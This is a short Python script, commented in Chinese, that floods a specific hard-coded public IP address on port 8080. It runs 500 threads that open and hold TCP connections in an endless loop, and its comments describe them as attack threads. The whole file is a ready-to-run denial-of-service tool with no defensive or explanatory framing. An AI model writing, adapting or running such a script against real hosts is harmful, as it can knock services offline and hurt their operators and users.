import socket
import time
import threading

def spam():
    while True:
        try:
            # 建立到目标的TCP连接
            s = socket.create_connection(("82.157.82.21",8080), timeout=1)
            time.sleep(1)  # 保持连接1秒（与服务器会话时间匹配）
            s.close()     # 关闭连接
        except Exception:
            pass
        time.sleep(0.01)  # 短暂延迟后重新连接
 
# 创建500个并发攻击线程
for _ in range(500):  
    threading.Thread(target=spam, daemon=True).start()
 
# 保持主线程存活
while True:
    time.sleep(1)


